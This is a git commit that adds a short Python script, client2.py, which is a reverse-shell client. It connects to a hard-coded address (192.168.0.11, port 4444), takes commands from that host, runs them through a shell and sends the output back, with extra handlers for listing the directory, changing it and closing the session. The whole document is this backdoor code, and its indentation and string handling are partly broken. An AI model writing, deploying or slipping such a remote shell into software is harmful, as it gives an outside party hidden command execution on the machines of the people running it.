9938deac12a08d6d9c73c60c4a1398845cf39aa4
joshDelta <joshsch44@outlook.com>
2017-07-03 22:59:32 -0400

    client.py

---
+++ client2.py
@@ -0,0 +1,42 @@
+import socket
+import subprocess
+import os
+
+def connect():
+	host = '192.168.0.11'
+	port = 4444
+
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((host, port))
+
+	while True:
+		command = s.recv(1024)
+		
+		if 'getdir' in command:
+			sendDir = os.getcwd()
+			s.send(sendDir)
+		
+		if 'kill' in command:
+			s.close()
+			break
+		if command[:2].decode("utf-8") == 'cd':
+			os.chdir(command[3:].decode("utf-8"))
+
+		else:
+			CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+			output_bytes = CMD.stdout.read() + CMD.stderr.read()
+
+                        output_str = str(output_bytes)
+			s.send(output_str)
+			print(output_str)
+
+
+def main():
+	connect()
+
+main()
+
+
+
+
+
